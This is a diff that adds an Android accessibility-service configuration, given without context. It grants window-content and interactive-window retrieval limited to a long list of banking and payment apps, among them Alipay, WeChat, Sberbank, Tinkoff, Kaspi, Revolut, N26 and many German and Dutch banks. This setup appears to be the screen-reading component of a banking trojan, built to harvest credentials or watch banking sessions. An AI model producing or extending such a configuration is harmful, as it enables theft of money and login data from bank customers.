@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"
+    android:canRetrieveWindowContent="true"
+    android:notificationTimeout="100"
+    android:packageNames="com.eg.android.AlipayGphone,com.tencent.mm,ru.sberbankmobile,ru.vtb24.mobilebanking.android,com.idamob.tinkoff.android,ru.alfabank.mobile.android,ru.alfabank.mobile.android.huawei,ru.gazprombank.android.mobilebank.app,ru.ozon.fintech.finance,ru.yoo.money,kz.kaspi.mobile,de.dkb.portalapp,com.starfinanz.smob.android.sfinanzstatus,de.ingdiba.bankingapp,com.ing.mobile,com.bunq.android,de.number26.android,com.revolut.revolut,de.commerzbanking.mobil,com.db.pwcc.dbmobile,de.comdirect.android,de.postbank.finanzassistent,de.fiduciagad.android.vrbanking,de.consorsbank,com.abnamro.nl.mobile.payments,nl.rabomobiel,nl.snsbank.mobielbetalen,nl.asnbank.mobielbetalen,nl.regiobank.mobielbetalen"
+    android:description="@string/accessibility_description" />
